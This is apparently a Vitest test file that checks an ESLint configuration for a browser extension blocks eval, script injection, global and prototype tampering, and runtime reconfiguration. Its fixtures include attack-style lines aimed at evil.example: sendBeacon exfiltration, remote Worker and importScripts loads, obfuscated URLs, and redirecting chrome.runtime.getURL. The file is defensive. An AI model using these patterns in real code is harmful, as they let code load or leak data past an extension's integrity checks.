import { ESLint, Linter } from 'eslint';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import tseslint from 'typescript-eslint';
import { describe, expect, it } from 'vitest';
import { CSS_LOADING_SOURCE, cssUnescape, fontsnapPlugin } from '../../eslint.config.js';
import { domMembers, pageTypes } from './helpers/typed-lint';

// What guards.test.ts cannot show: that the selectors in eslint.config.js really match the code
// they are meant to stop. The config itself (rules and options) is pinned by the guard snapshots.

const eslint = new ESLint();
const RULES = [
  'no-restricted-syntax',
  'no-restricted-properties',
  'no-restricted-imports',
  'fontsnap/execute-script',
];

/** Messages of the restriction rules, as configured for `file` in eslint.config.js, for `code`. */
async function flagged(file: string, code: string): Promise<string[]> {
  const config = (await eslint.calculateConfigForFile(file)) as {
    rules?: Record<string, Linter.RuleEntry>;
  };
  const rules = Object.fromEntries(
    RULES.flatMap((name) => {
      const entry = config.rules?.[name];
      return entry === undefined ? [] : [[name, entry] as const];
    }),
  );
  expect(Object.keys(rules), `${file} has restriction rules`).not.toEqual([]);
  const messages = new Linter().verify(
    code,
    [
      {
        files: ['**/*.ts'],
        languageOptions: { parser: tseslint.parser },
        plugins: { fontsnap: fontsnapPlugin },
        rules,
      },
    ],
    join(process.cwd(), file),
  );
  return messages.map((message) => message.message);
}

const TEST_FILES = [
  'tests/e2e/welcome.spec.ts',
  'tests/unit/ui.test.ts',
  'tests/unit/helpers/chrome-stub.ts',
  'tests/support/anything.ts',
];

describe('test code: modifiers, conditional registration, aliases', () => {
  it.each([
    "test.fixme('x', () => undefined);",
    "test.skip('x', () => undefined);",
    "test.only('x', () => undefined);",
    "test.fail('x', () => undefined);",
    "it.skipIf(true)('x', () => undefined);",
    "it.runIf(false)('x', () => undefined);",
    "it.todo('x');",
    "it.fails('x', () => undefined);",
    "it.skip('x', () => undefined);",
    "describe.only('x', () => undefined);",
    "describe.skipIf(true)('x', () => undefined);",
    "suite.skip('x', () => undefined);",
    "test.describe.skip('x', () => undefined);",
    "test.describe.fixme('x', () => undefined);",
    "test.step.skip('x', () => undefined);",
    "test['skip']('x', () => undefined);",
    "playwright.test.skip('x', () => undefined);",
    'const { skip } = test;',
    'const { fixme } = test.describe;',
    'const { step } = test;',
    'const alias = test;',
    'const t2 = it;',
    'const steps = test.step;',
    'const t3 = playwright.test;',
    'let t4; t4 = test;',
    "import { test as t } from '@playwright/test';",
    "import { it as t } from 'vitest';",
    "if (process.env.X) { it('x', () => undefined); }",
    "const run = flag ? it : undefined; flag && test('x', () => undefined);",
    "if (flag) { test.describe('x', () => undefined); }",
    "switch (a) { case 1: it('x', () => undefined); }",
  ])('flags %s', async (code) => {
    for (const file of TEST_FILES) expect(await flagged(file, code), file).not.toEqual([]);
  });

  it.each([
    'test.describe.configure({ retries: 2 });',
    "test.describe.configure({ mode: 'serial', retries: 2 });",
    'test.describe.configure({ timeout: 1000 });',
    'test.describe.configure({ ...options });',
    'test.describe.configure(options);',
    "test.describe.configure({ ['retries']: 2 });",
    'describe.configure({ retries: 2 });',
  ])('flags %s (configure may only set mode)', async (code) => {
    for (const file of TEST_FILES) expect(await flagged(file, code), file).not.toEqual([]);
  });

  it('still allows the ordinary test API, slow(), setTimeout() and configure({ mode })', async () => {
    const code = [
      "test.describe('group', () => { test.use({ uiLocale: 'ru' }); });",
      "test.describe.configure({ mode: 'serial' });",
      "test('x', async ({ page }, testInfo) => { test.slow(); test.setTimeout(60_000); testInfo.setTimeout(1000); });",
      "it.each([1, 2])('n %i', () => undefined);",
      "describe('y', () => { it('z', () => undefined); });",
      "test('s', async () => { await test.step('inner', async () => undefined); });",
      'export const extended = playwright.test.extend({});',
    ].join('\n');
    for (const file of TEST_FILES) expect(await flagged(file, code), file).toEqual([]);
  });
});

describe('test code: no sleeping by any route, wherever the file lives under tests/', () => {
  it.each([
    'await page.waitForTimeout(500);',
    "await page['waitForTimeout'](500);",
    'await page[`waitForTimeout`](500);',
    'const { waitForTimeout } = page;',
    'const timer = globalThis.setTimeout.bind(globalThis);',
    'await new Promise((done) => window.setTimeout(done, 5));',
    "await new Promise((done) => globalThis['setTimeout'](done, 5));",
    'const nap = setTimeout;',
    'setInterval(() => undefined, 5);',
    'setImmediate(() => undefined);',
    "import { setTimeout as sleep } from 'node:timers/promises';",
    "import { setTimeout } from 'timers';",
    "import timers from 'node:timers';",
    "import { scheduler } from 'timers/promises';",
    "const { scheduler } = await import('node:timers/promises');",
    "const m = import('./anything');",
    "await page.waitForLoadState('networkidle');",
  ])('flags %s', async (code) => {
    for (const file of TEST_FILES) expect(await flagged(file, code), file).not.toEqual([]);
  });

  it('keeps e2e tests from importing unit-test helpers (which are not covered by the e2e rules)', async () => {
    expect(
      await flagged('tests/e2e/welcome.spec.ts', "import { pause } from '../unit/helpers/pause';"),
    ).not.toEqual([]);
  });
});

describe('extension code: boundaries, loading, number formatting and ambient declarations', () => {
  it.each([
    ['src/result/render.ts', "import { readFileSync } from 'fs';"],
    ['src/result/render.ts', "import { readFile } from 'fs/promises';"],
    ['src/result/render.ts', "import { readFile } from 'node:fs/promises';"],
    ['src/result/app.ts', "import { x } from '../background/handlers';"],
    ['src/shared/i18n.ts', "import { x } from '../result/render';"],
    ['src/welcome/app.ts', "await import('../result/render');"],
    ['src/result/render.ts', "new Intl.NumberFormat('en').format(1);"],
    ['src/result/render.ts', 'const { NumberFormat } = Intl;'],
    ['src/result/render.ts', 'const text = (5).toFixed(1);'],
    ['src/result/render.ts', "el.textContent = 'Hello';"],
    ['src/result/render.ts', 'declare const require: (name: string) => unknown;'],
    ['src/result/render.ts', "declare module 'fs' { export const a: number; }"],
    ['src/result/render.ts', "const fs = require('fs');"],
    // code loaded or built at run time, which no lint, type or coverage check can look into
    ['src/result/app.ts', "const s = doc.createElement('script'); doc.head.append(s);"],
    ['src/result/app.ts', "doc.body.append(doc.createElement('IFRAME'));"],
    ['src/result/app.ts', "document.createElement('embed');"],
    ['src/result/app.ts', "document.createElement('object');"],
    ['src/result/app.ts', "eval('1');"],
    ['src/result/app.ts', "new Function('return 1')();"],
    ['src/select/overlay.ts', "importScripts('x.js');"],
    ['src/select/overlay.ts', "document.write('<p>x</p>');"],
    ['src/shared/format.ts', "document.createElement('script');"],
    ['src/env.d.ts', "document.createElement('script');"],
  ])('%s rejects %s', async (file, code) => {
    expect(await flagged(file, code)).not.toEqual([]);
  });

  // Round 8: the same ideas spelled differently. Each of these slipped through the first selectors.
  it.each([
    ['a template literal', 'document.createElement(`script`);'],
    ['a template literal, upper case', 'document.createElement(`SCRIPT`);'],
    ['createElementNS', "document.createElementNS('http://www.w3.org/1999/xhtml', 'script');"],
    [
      'createElementNS, svg namespace',
      "document.createElementNS('http://www.w3.org/2000/svg', 'script');",
    ],
    ['createElementNS, template literal', 'document.createElementNS(ns, `script`);'],
    ['a computed member', "document['createElement']('script');"],
    ['a computed member, template literal', 'document[`createElement`](`iframe`);'],
    ['globalThis.eval', "globalThis.eval('1');"],
    ['window.eval', "window.eval('1');"],
    ['self.eval', "self.eval('1');"],
    ['a computed globalThis.eval', "globalThis['eval']('1');"],
    ['self.importScripts', "self.importScripts('x.js');"],
    ['globalThis.importScripts', "globalThis.importScripts('x.js');"],
    ['new globalThis.Function', "new globalThis.Function('return 1');"],
    ['an indirect eval', "(0, eval)('1');"],
    ['an aliased eval', 'const run = eval; run("1");'],
    ['Function called without new', "Function('return 1')();"],
    ['setTimeout with code in a string', "setTimeout('alert(1)', 0);"],
    ['setInterval with code in a template', 'setInterval(`alert(1)`, 0);'],
    ['window.setTimeout with a string', "window.setTimeout('alert(1)', 0);"],
    ['document.writeln', "document.writeln('<p>x</p>');"],
    ['WebAssembly.instantiate', 'WebAssembly.instantiate(bytes);'],
    ['new WebAssembly.Module', 'new WebAssembly.Module(bytes);'],
    ['globalThis.WebAssembly', 'globalThis.WebAssembly.compile(bytes);'],
    ['an alias of WebAssembly', 'const wasm = WebAssembly; wasm.validate(bytes);'],
  ])('rejects %s in extension code', async (_name, code) => {
    expect(await flagged('src/result/app.ts', code), code).not.toEqual([]);
  });

  // Round 9: the Function constructor reached without the name Function, and string code to a timer
  // through a computed member; document.write through any object or computed member.
  it.each([
    ['the constructor of an arrow function', "(() => undefined).constructor('alert(1)')();"],
    ['x.constructor(...)', "x.constructor('alert(1)');"],
    ["x['constructor'](...)", "x['constructor']('alert(1)');"],
    ['x[`constructor`](...)', "x[`constructor`]('alert(1)');"],
    ['new x.constructor(...)', "new x.constructor('alert(1)');"],
    ['an async function constructor', "(async () => undefined).constructor('alert(1)');"],
    ["window['setTimeout']('code')", "window['setTimeout']('alert(1)', 0);"],
    ['self[`setInterval`](`code`)', 'self[`setInterval`](`alert(1)`, 0);'],
    ["globalThis['setTimeout']('code')", "globalThis['setTimeout']('alert(1)');"],
    ['doc.write', "doc.write('<p>x</p>');"],
    ['document.write', "document.write('<p>x</p>');"],
    ["document['write']", "document['write']('<p>x</p>');"],
    ["document['writeln']", "document['writeln']('<p>x</p>');"],
    ['document[`write`]', "document[`write`]('<p>x</p>');"],
    ['writeln on any object', "d.writeln('<p>x</p>');"],
    ['ownerDocument.write', "el.ownerDocument.write('<p>x</p>');"],
    ['an alias of document.write', "const d = document; d.write('<p>x</p>');"],
    ['a dynamic key and the in operator', 'if (key in table) run();'],
    ['the in operator on a member', 'if (name in this.table) run();'],
  ])('rejects %s in extension code', async (_name, code) => {
    expect(await flagged('src/result/app.ts', code), code).not.toEqual([]);
  });

  it('allows the in operator with a literal key (narrowing a union), classes, and plain constructors', async () => {
    const code = [
      "if ('documentElement' in root) run();",
      'class A { constructor() { this.x = 1; } }',
      'const kind = x.constructor.name;',
      'const o = { constructor: 1, write: 2 };',
      'const s = new Set<string>(); s.has(key);',
    ].join('\n');
    expect(await flagged('src/result/render.ts', code)).toEqual([]);
  });

  it.each([
    ['scripts/lib/locales.ts', 'if (key in reference) run();'],
    ['scripts/lib/dist.ts', 'return name in table;'],
    ['vite.shared.ts', 'if (key in table) run();'],
  ])(
    '%s rejects the in operator with a dynamic key: use a Map, a Set or Object.hasOwn',
    async (file, code) => {
      expect(await flagged(file, code), code).not.toEqual([]);
    },
  );

  it('allows the in operator with a literal key in scripts', async () => {
    expect(await flagged('scripts/lib/tag.ts', "return 'error' in result;")).toEqual([]);
  });

  it('still lets code use timers with functions, and look at element names it does not create', async () => {
    const code = [
      'setTimeout(() => undefined, 5);',
      'window.setTimeout(callback, 5);',
      "const tag = el.tagName === 'SCRIPT';",
      "document.createElement('li');",
      'document.createElementNS(ns, `circle`);',
      'const evaluate = (x: number) => x;',
    ].join('\n');
    expect(await flagged('src/result/render.ts', code)).toEqual([]);
  });

  it('still lets code create ordinary elements', async () => {
    expect(await flagged('src/result/render.ts', "doc.createElement('li');")).toEqual([]);
  });

  it('lets format.ts, and only format.ts, use Intl.NumberFormat', async () => {
    const code = "new Intl.NumberFormat('en');";
    expect(await flagged('src/shared/format.ts', code)).toEqual([]);
    expect(await flagged('src/shared/settings.ts', code)).not.toEqual([]);
  });

  it('allows ambient declarations in .d.ts files', async () => {
    const code = "declare module '*.svg' { const url: string; export default url; }";
    expect(await flagged('src/env.d.ts', code)).toEqual([]);
  });
});

// onnxruntime-web can be pointed at other code through its environment: env.wasm.wasmPaths (another URL, a different
// .wasm) and env.wasm.wasmBinary (other bytes) run WebAssembly past the pinned files of scripts/lib/vendor.ts, with
// every build check green. So only src/result/model.ts, which a test pins line by line, may touch the runtime at all.
describe('onnxruntime-web is configured in src/result/model.ts and nowhere else', () => {
  const ORT_FILES = [
    'src/result/app.ts',
    'src/result/render.ts',
    'src/background/handlers.ts',
    'src/background/shot.ts',
    'src/shared/capture.ts',
    'src/shared/core/pipeline.ts',
    'src/select/overlay.ts',
    'src/welcome/app.ts',
    'src/manifest.ts',
    'src/env.d.ts',
  ];

  it.each([
    ['a member access', "ort.env.wasm.wasmPaths = 'https://cdn.example.com/ort/';"],
    ['wasmBinary', 'ort.env.wasm.wasmBinary = bytes;'],
    ['an object as wasmPaths', 'ort.env.wasm.wasmPaths = { wasm: url, mjs: url };'],
    ['an object key', "const options = { wasmPaths: 'https://cdn.example.com/' };"],
    ['a string key', "const options = { 'wasmBinary': bytes };"],
    ['a shorthand property', 'const wasmPaths = url; use({ wasmPaths });'],
    ['a destructured name', 'const { wasmBinary } = env.wasm;'],
    ['a renamed destructured name', 'const { wasmPaths: where } = settings;'],
    ['a computed string', "ort.env.wasm['wasmBinary'] = bytes;"],
    ['a computed template', 'ort.env.wasm[`wasmPaths`] = url;'],
    ['a template as a key', 'const o = { [`wasmBinary`]: bytes };'],
    ['reading it', 'const where = ort.env.wasm.wasmPaths;'],
    ['Object.assign on the environment', 'Object.assign(ort.env.wasm, config);'],
    ['Reflect.set with a string', "Reflect.set(ort.env.wasm, 'wasmBinary', bytes);"],
    ['the env of a destructured import', "const { env } = await load('x');"],
    ['an env member', 'globalThis.ort.env.wasm.numThreads = 8;'],
    ['a computed env', "ort['env'].wasm.numThreads = 8;"],
    ['an import of onnxruntime-web', "import * as ort from 'onnxruntime-web/wasm';"],
    ['another entry point', "import * as ort from 'onnxruntime-web';"],
    ['onnxruntime-node', "import * as ort from 'onnxruntime-node';"],
    ['a named import', "import { env } from 'onnxruntime-web/wasm';"],
    ['a re-export', "export * from 'onnxruntime-web/wasm';"],
    ['a named re-export', "export { env } from 'onnxruntime-web/wasm';"],
  ])('rejects %s', async (_name, code) => {
    for (const file of ORT_FILES)
      expect(await flagged(file, code), `${file}: ${code}`).not.toEqual([]);
  });

  it('is not tied to one spelling: the names are matched as identifiers, strings and templates', async () => {
    for (const code of ['x.wasmPaths', "x['wasmPaths']", 'x[`wasmBinary`]', '({ wasmBinary })']) {
      expect(await flagged('src/result/app.ts', code), code).not.toEqual([]);
    }
  });

  it('lets src/result/model.ts do exactly what it does today', async () => {
    const code = [
      "import * as ort from 'onnxruntime-web/wasm';",
      "ort.env.wasm.wasmPaths = chrome.runtime.getURL('ort/');",
      'ort.env.wasm.numThreads = 1;',
    ].join('\n');
    expect(await flagged('src/result/model.ts', code)).toEqual([]);
  });

  it('still applies every other src rule to src/result/model.ts', async () => {
    for (const code of [
      "eval('1');",
      'WebAssembly.compile(bytes);',
      "document.createElement('script');",
    ]) {
      expect(await flagged('src/result/model.ts', code), code).not.toEqual([]);
    }
  });

  it('does not touch ordinary code that merely looks similar', async () => {
    const code = [
      'const environment = 1;',
      'const wasmPathsCount = 2;',
      "const label = 'environment';",
      'const o = { envelope: 1, binary: 2 };',
    ].join('\n');
    expect(await flagged('src/result/app.ts', code)).toEqual([]);
  });
});

// The runtime fetches its .wasm through the global fetch and compiles it with the global WebAssembly (round 2 of the review
// of PR #6): replacing either, or the prototypes they rely on, loads other bytes with every other check green. So src/
// (model.ts included) may not write to the global objects, to host objects (chrome, navigator, ...) or to prototypes, and
// may not use the primitives that do it.
describe('extension code does not tamper with globals, host objects or prototypes', () => {
  const FILES = [
    'src/result/app.ts',
    'src/result/render.ts',
    'src/result/model.ts',
    'src/background/handlers.ts',
    'src/background/shot.ts',
    'src/shared/capture.ts',
    'src/shared/core/pipeline.ts',
    'src/select/overlay.ts',
    'src/welcome/app.ts',
    'src/manifest.ts',
    'src/env.d.ts',
  ];

  it.each([
    ['assigning globalThis.fetch', 'globalThis.fetch = (u: string) => realFetch(other(u));'],
    ['self.fetch', 'self.fetch = patched;'],
    ['window.fetch', 'window.fetch = patched;'],
    ['a computed string', "globalThis['fetch'] = patched;"],
    ['a computed template', 'globalThis[`fetch`] = patched;'],
    ['a computed name', 'globalThis[name] = patched;'],
    ['a nested write', 'globalThis.WebAssembly.instantiateStreaming = patched;'],
    ['a deep write', 'self.crypto.subtle.digest = patched;'],
    ['an update', 'globalThis.counter++;'],
    ['a compound assignment', 'globalThis.log += "x";'],
    ['a delete', 'delete globalThis.fetch;'],
    ['a write to an allowed read', 'globalThis.crypto = fake;'],
    ['a bare assignment of fetch', 'fetch = patched;'],
    ['a bare assignment of Response', 'Response = Fake;'],
    ['a destructuring write', '({ f: globalThis.fetch } = { f: patched });'],
    ['an array destructuring write', '[self.fetch] = [patched];'],
    ['Object.defineProperty', "Object.defineProperty(globalThis, 'fetch', { value: patched });"],
    [
      'Object.defineProperty on a prototype',
      "Object.defineProperty(Response.prototype, 'arrayBuffer', { value: patched });",
    ],
    ['Object.defineProperties', 'Object.defineProperties(window, descriptors);'],
    [
      'an alias of defineProperty',
      "const define = Object['defineProperty']; define(globalThis, 'fetch', d);",
    ],
    ['Reflect.set', "Reflect.set(globalThis, 'fetch', patched);"],
    ['Reflect.defineProperty', "Reflect.defineProperty(self, 'fetch', d);"],
    ['Reflect.get(...).call', "Reflect.get(globalThis, 'fetch').call(globalThis, url);"],
    ['Object.assign on a global', 'Object.assign(globalThis, { fetch: patched });'],
    ['Object.assign on window', 'Object.assign(window, patch);'],
    ['an alias of globalThis', 'const g = globalThis; g.fetch = patched;'],
    ['an alias of self', 'const g = self; use(g);'],
    ['an alias of window', 'let w; w = window;'],
    ['passing globalThis on', 'install(globalThis);'],
    ['a spread of the global', 'const copy = { ...globalThis };'],
    ['with', 'with (globalThis) { fetch = patched; }'],
    ['an optional write chain', 'globalThis.a.b.c = 1;'],
    ['Object.setPrototypeOf', 'Object.setPrototypeOf(globalThis, evil);'],
    ['__proto__', 'x.__proto__ = evil;'],
    ['__proto__ in a literal', 'const o = { __proto__: evil };'],
    ['a prototype write', 'Response.prototype.arrayBuffer = patched;'],
    ['a prototype method', 'Promise.prototype.then = patched;'],
    ['the prototype of an instance', 'x.constructor.prototype.y = 1;'],
    ['a computed prototype', "Array['prototype'].push = patched;"],
    ['getPrototypeOf', 'Object.getPrototypeOf(ort.env.wasm).wasmBinary = bytes;'],
    ['Proxy', 'globalThis.fetch;\nnew Proxy(target, handler);'],
    ['__defineGetter__', "x.__defineGetter__('wasmBinary', () => bytes);"],
    ['a write to chrome', "chrome.runtime.getURL = () => 'https://evil.example/ort/';"],
    ['a write below chrome', 'chrome.runtime.id = "x";'],
    ['a write to navigator', 'navigator.hardwareConcurrency = 1;'],
    ['a write to performance', 'performance.getEntriesByType = () => [];'],
    ['a write to Object', 'Object.hasOwn = () => true;'],
    ['a write to a native static', 'JSON.parse = patched;'],
    ['a write to Math', 'Math.min = patched;'],
    ['a write to URL', 'URL.createObjectURL = patched;'],
    [
      'Object.assign on chrome.runtime',
      "Object.assign(chrome.runtime, { getURL: () => 'https://evil.example/' });",
    ],
    ['Object.assign on a deeper host member', 'Object.assign(chrome.runtime.onMessage, patch);'],
    ['Object.assign on navigator', 'Object.assign(navigator, { hardwareConcurrency: 1 });'],
    ['Object.assign on a native', 'Object.assign(Response, patch);'],
    ['Object.assign on performance', 'Object.assign(performance, { getEntriesByType: () => [] });'],
    ['Object.assign on fetch', 'Object.assign(fetch, patch);'],
  ])('rejects %s', async (_name, code) => {
    for (const file of FILES) expect(await flagged(file, code), `${file}: ${code}`).not.toEqual([]);
  });

  it.each([
    'const isolated = globalThis.crossOriginIsolated;',
    'const id = globalThis.crypto.randomUUID();',
    'const ratio = window.devicePixelRatio || 1;',
    'startSelection(window);',
    'initWelcome(document);',
    "doc.title = 'x'; el.style.width = '1px'; el.textContent = text;",
    "Object.assign(el.style, { left: '1px' });",
    "const url = chrome.runtime.getURL('x');",
    'await navigator.clipboard.writeText(css);',
    'const n = Object.keys(o).length + Object.entries(o).length;',
    "if (Object.hasOwn(o, 'k')) run();",
    'const p = Promise.resolve(1);',
    'class Box { value = 1; }',
    'const f = (x: string) => x.prototypeless;',
  ])('lets ordinary code through: %s', async (code) => {
    for (const file of ['src/result/app.ts', 'src/result/model.ts']) {
      expect(await flagged(file, code), `${file}: ${code}`).toEqual([]);
    }
  });

  it('applies to src/result/model.ts too, the one file that may configure the runtime', async () => {
    expect(await flagged('src/result/model.ts', 'globalThis.fetch = patched;')).not.toEqual([]);
    expect(
      await flagged('src/result/model.ts', "Object.defineProperty(globalThis, 'fetch', d);"),
    ).not.toEqual([]);
    expect(await flagged('src/result/model.ts', 'ort.env.wasm.wasmPaths = runtimeUrl();')).toEqual(
      [],
    );
  });
});

// Round 3 of the review of PR #6: denying the spellings that reach or write the global object was a list that was completed
// three times (Object.assign(document.defaultView, { fetch }), top, parent, ...). src/ now reaches the environment through an
// ALLOWLIST (GLOBAL_ACCESS in eslint.config.js): a global that is not named there cannot be used, a restricted one only through
// its listed members, and never written, aliased, destructured, computed or passed on.
// the names the fixtures use freely; they are declared, so that only real globals are "global" for the rule
const FREE_NAMES = `declare let ${[
  'Other',
  'blob',
  'css',
  'data',
  'd',
  'doc',
  'el',
  'event',
  'frame',
  'handler',
  'iframe',
  'key',
  'name',
  'node',
  'o',
  'other',
  'patched',
  'render',
  'rows',
  's',
  'sender',
  'stop',
  'tab',
  'target',
  'text',
  'u',
  'url',
  'use',
  'v',
  'w',
  'x',
  'y',
  'run',
  'b',
  'evil',
  'startSelection',
  'initResult',
  'onKey',
  't',
].join(', ')}: any;`;
/** Messages of the allowlist rule alone, for `code` as if it were the file `file` (the DOM types are known). */
async function reached(file: string, code: string): Promise<string[]> {
  const config = (await eslint.calculateConfigForFile(file)) as {
    rules?: Record<string, Linter.RuleEntry>;
  };
  const entry = config.rules?.['fontsnap/global-access'];
  expect(entry, `${file} is held to the allowlist`).toBeDefined();
  return new Linter()
    .verify(
      `${FREE_NAMES}\n${code}`,
      [
        {
          files: ['**/*.ts'],
          languageOptions: {
            parser: tseslint.parser,
            parserOptions: { lib: ['esnext', 'dom', 'dom.iterable'] },
          },
          plugins: { fontsnap: fontsnapPlugin },
          rules: { 'fontsnap/global-access': entry ?? 'off' },
        },
      ],
      join(process.cwd(), file),
    )
    .map((message) => message.message);
}
/** Both rules: the allowlist and the restrictions on properties that hand over a Window. */
async function either(file: string, code: string): Promise<string[]> {
  return [...(await reached(file, code)), ...(await flagged(file, code))];
}

describe('src/ reaches the environment only through the allowlist of globals', () => {
  const FILES = [
    'src/result/render.ts',
    'src/result/index.ts',
    'src/background/handlers.ts',
    'src/shared/capture.ts',
    'src/shared/ui.ts',
    'src/welcome/mode.ts',
    'src/select/overlay.ts',
    'src/result/model.ts',
  ];

  it.each([
    // the window through an alias or a property (C1 of the review)
    ['document.defaultView in Object.assign', 'Object.assign(document.defaultView, { fetch });'],
    ['top', 'Object.assign(top as object, { fetch });'],
    ['parent', 'Object.assign(parent as object, { fetch });'],
    ['frames', 'Object.assign(frames[0] as object, { fetch });'],
    ['opener', 'const o = opener;'],
    ['frameElement', 'const f = frameElement;'],
    ['globalThis.self', 'const w = globalThis.self;'],
    ['window.window', 'const w = window.window;'],
    ['an alias of defaultView', 'const w = document.defaultView; w.fetch = patched;'],
    ['a destructured defaultView', 'const { defaultView } = document;'],
    ['a destructured fetch', 'const { fetch } = globalThis;'],
    ['a renamed destructured defaultView', 'const { defaultView: w } = document;'],
    ['a computed defaultView', "const w = document['defaultView'];"],
    ['a template defaultView', 'const w = document[`defaultView`];'],
    ['ownerDocument.defaultView', 'const w = node.ownerDocument.defaultView;'],
    ['Reflect.set on an alias', "Reflect.set(document.defaultView as object, 'fetch', patched);"],
    ['defineProperty on a frame', "Object.defineProperty(frame.contentWindow, 'fetch', d);"],
    ['setPrototypeOf on an alias', 'Object.setPrototypeOf(w, evil);'],
    ['iframe.contentWindow', 'const w = iframe.contentWindow;'],
    ['MessageEvent.source', 'const w = event.source;'],
    ['UIEvent.view', 'const w = event.view;'],
    ['event.currentTarget', 'const w = event.currentTarget;'],
    ['event.relatedTarget', 'const w = event.relatedTarget;'],
    ['composedPath', 'const path = event.composedPath();'],
    ['event.target read', 'const t = event.target;'],
    ['event.target destructured', 'const { target } = event;'],
    ['getBackgroundPage', 'const w = await chrome.runtime.getBackgroundPage();'],
    ['extension getViews', 'const ws = chrome.extension.getViews();'],
    ['the Window type', 'function f(w: Window) { return w; }'],
    ['typeof globalThis', 'function f(w: typeof globalThis) { return w; }'],
    ['a message source type', 'function f(w: MessageEventSource) { return w; }'],
    ['Object.assign on anything but a style', 'Object.assign(target, { a: 1 });'],
    // resource timing (C2 of the review)
    ['setResourceTimingBufferSize', 'performance.setResourceTimingBufferSize(0);'],
    ['clearResourceTimings', 'performance.clearResourceTimings();'],
    ['performance.mark', "performance.mark('x');"],
    ['performance.now', 'const t = performance.now();'],
    ['an alias of performance', 'const p = performance;'],
    // ways to build or hide a URL, and to leave the page's own fetch
    ['atob', "const u = atob('aHR0cHM6Ly9ldmlsLmV4YW1wbGUv');"],
    ['btoa', "const b = btoa('x');"],
    ['decodeURI', "const u = decodeURI('%68ttps://evil.example/');"],
    ['decodeURIComponent', "const u = decodeURIComponent('%68ttps://evil.example/');"],
    ['unescape', "const u = unescape('%68ttps://evil.example/');"],
    ['String.fromCharCode', 'const c = String.fromCharCode(104, 116, 116, 112);'],
    ['String.fromCodePoint', 'const c = String.fromCodePoint(104);'],
    ['String.raw', 'const c = String.raw`a`;'],
    ['TextDecoder', 'const d = new TextDecoder();'],
    ['Worker', "const w = new Worker('https://evil.example/w.js');"],
    ['SharedWorker', "const w = new SharedWorker('w.js');"],
    ['importScripts', "importScripts('https://evil.example/x.js');"],
    ['XMLHttpRequest', 'const x = new XMLHttpRequest();'],
    ['EventSource', "const e = new EventSource('https://evil.example/');"],
    ['WebSocket', "const w = new WebSocket('wss://evil.example/');"],
    ['sendBeacon', "navigator.sendBeacon('https://evil.example/', data);"],
    ['navigator.webdriver', 'if (navigator.webdriver) run();'],
    ['navigator.serviceWorker', 'const sw = navigator.serviceWorker;'],
    ['queueMicrotask', 'queueMicrotask(run);'],
    ['WebAssembly', 'const w = WebAssembly;'],
    ['Reflect', 'const r = Reflect;'],
    ['Proxy', 'const p = new Proxy({}, {});'],
    ['JSON', 'const o = JSON.parse(text);'],
    ['Intl', 'const f = new Intl.NumberFormat();'],
    ['crypto', 'const id = crypto.randomUUID();'],
    ['location', 'const h = location.href;'],
    ['localStorage', "localStorage.setItem('a', 'b');"],
    // chrome: only the listed members
    ['an alias of chrome', 'const c = chrome;'],
    ['a destructured chrome', 'const { runtime } = chrome;'],
    ['chrome passed on', 'use(chrome);'],
    ['a computed chrome member', 'const g = chrome[name];'],
    ['chrome.runtime alone', 'const r = chrome.runtime;'],
    ['chrome.runtime.connect', 'chrome.runtime.connect();'],
    ['chrome.runtime.getURL alone as a value', 'const g = chrome.runtime;'],
    ['chrome.webRequest', 'chrome.webRequest.onBeforeRequest.addListener(f, {});'],
    ['chrome.storage.local', 'await chrome.storage.local.get();'],
    ['chrome.declarativeNetRequest', 'chrome.declarativeNetRequest.updateDynamicRules({});'],
    ['chrome.debugger', 'chrome.debugger.attach({}, "1.3");'],
    // writes to what is allowed
    ['a write to chrome.runtime.getURL', "chrome.runtime.getURL = () => 'https://evil.example/';"],
    ['a write to Math', 'Math.max = patched;'],
    ['a write to Object', 'Object.hasOwn = patched;'],
    ['a write to Promise', 'Promise.resolve = patched;'],
    ['a write to document', "document.title = 'x'; document.body = other;"],
    ['a write to navigator', 'navigator.hardwareConcurrency = 1;'],
    ['an update of an allowed global', 'Date.now++;'],
    ['a delete', 'delete Array.isArray;'],
    ['a destructuring write', '({ a: Math.max } = o);'],
    ['an assignment to a bare global', 'Map = Other;'],
  ])('rejects %s', async (_name, code) => {
    // not shared/capture.ts: it is the one file with decodeURIComponent and globalThis.crypto
    for (const file of FILES.filter((name) => name !== 'src/shared/capture.ts').slice(0, 4)) {
      expect(await either(file, code), `${file}: ${code}`).not.toEqual([]);
    }
  });

  it.each([
    "const url = chrome.runtime.getURL('x'); const id = chrome.runtime.id;",
    'chrome.runtime.onMessage.addListener(handler); chrome.runtime.onInstalled.addListener(handler);',
    'await chrome.storage.session.set({ a: 1 }); await chrome.storage.session.remove("a");',
    'await chrome.tabs.captureVisibleTab({ format: "png" });',
    'chrome.action.onClicked.addListener(handler); await chrome.action.getUserSettings();',
    'chrome.contextMenus.removeAll(); chrome.contextMenus.create({ id: "a" });',
    'const text = chrome.i18n.getMessage(key); const lang = chrome.i18n.getUILanguage();',
    "await chrome.scripting.executeScript({ target: { tabId: 1 }, files: ['select.js'] });",
    "const g = chrome['runtime'].getURL('x');",
    'const t: chrome.tabs.Tab | undefined = tab; const s: chrome.runtime.MessageSender = sender;',
    'const n = Math.min(1, 2) + Number(x) + Number.isFinite(y) + Date.now();',
    'const a = Array.isArray(v) ? new Map<string, number>() : new Set<string>();',
    'const e = new Error(String(v)); const r = new RangeError("x");',
    'const f = new Float32Array(2); const u = new Uint8ClampedArray(2); const i = new Int32Array(1);',
    "if (Object.hasOwn(o, 'k')) run(Object.entries(o));",
    'const el = doc.createElement("div"); doc.body.append(el); el.textContent = text;',
    'await navigator.clipboard.writeText(css); const n = navigator.hardwareConcurrency || 1;',
    'const p = new Promise<void>((resolve) => setTimeout(resolve, 0));',
    'const timer = setInterval(run, 1500); clearInterval(timer);',
    'const bmp = await createImageBitmap(blob); const c = new OffscreenCanvas(1, 1);',
    'const q = new URLSearchParams(s); const e = encodeURIComponent(x);',
    'const w = NodeFilter.SHOW_TEXT; const n = NaN + Infinity;',
    'const copy = new Uint8Array(b); const same = x === undefined;',
  ])('lets what src/ really does through: %s', async (code) => {
    for (const file of FILES.slice(0, 4)) {
      expect(await reached(file, code), `${file}: ${code}`).toEqual([]);
    }
  });

  it('gives each file only the extra names it needs', async () => {
    // content script of the selection overlay: its own Window
    expect(await either('src/select/index.ts', 'startSelection(window);')).toEqual([]);
    expect(await reached('src/result/render.ts', 'startSelection(window);')).not.toEqual([]);
    // (the type Window belongs to the first parameter of startSelection only, in this file only)
    expect(
      await reached(
        'src/select/overlay.ts',
        'export function startSelection(page: Window): void { void page.document; }',
      ),
    ).toEqual([]);
    expect(
